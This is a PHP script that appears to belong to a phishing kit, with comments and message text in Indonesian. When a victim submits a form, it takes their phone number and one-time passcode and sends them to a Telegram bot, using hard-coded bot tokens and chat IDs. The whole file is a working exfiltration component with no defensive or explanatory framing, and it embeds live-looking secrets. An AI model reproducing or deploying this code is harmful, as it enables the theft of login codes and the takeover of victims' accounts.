<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = $_POST['otp'] ?? '';
    $phone = $_POST['phone'] ?? '';

    $bots = [
        ["token" => "7203632734:AAEFTU6zKGg3U4PKHmqzPucMUj_ZZTvZvQI", "chatId" => "2021053735"],
        ["token" => "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", "chatId" => "5876510981"]
    ];

    // ambil botIndex yg dipakai di phone.php
    $index = $_SESSION['lastBotIndex'] ?? 0;
    $bot = $bots[$index];

    $message = "🔐 *OTP Masuk*\n━━━━━━━━━━━━━━\n📞 Nomor HP: `{$phone}`\n📩 OTP: `{$otp}`\n━━━━━━━━━━━━━━";

    $api = "https://api.telegram.org/bot{$bot['token']}/sendMessage";

    $response = file_get_contents($api . "?" . http_build_query([
        "chat_id" => $bot['chatId'],
        "text" => $message,
        "parse_mode" => "Markdown"
    ]));

    echo $response;
}
